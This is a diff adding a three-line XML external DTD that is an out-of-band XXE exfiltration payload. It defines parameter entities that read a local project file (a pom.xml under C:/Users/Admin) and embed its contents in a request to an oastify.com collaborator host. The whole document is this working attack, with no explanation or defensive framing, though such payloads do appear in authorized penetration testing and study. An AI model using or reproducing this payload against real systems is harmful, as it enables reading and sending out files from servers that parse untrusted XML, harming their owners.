@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///C:/Users/Admin/IdeaProjects/Lohong2/pom.xml">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://sok93u5mitdgowk2hu30t8xlhcn3btzi.oastify.com/aaa?%file;'>">
+%all;
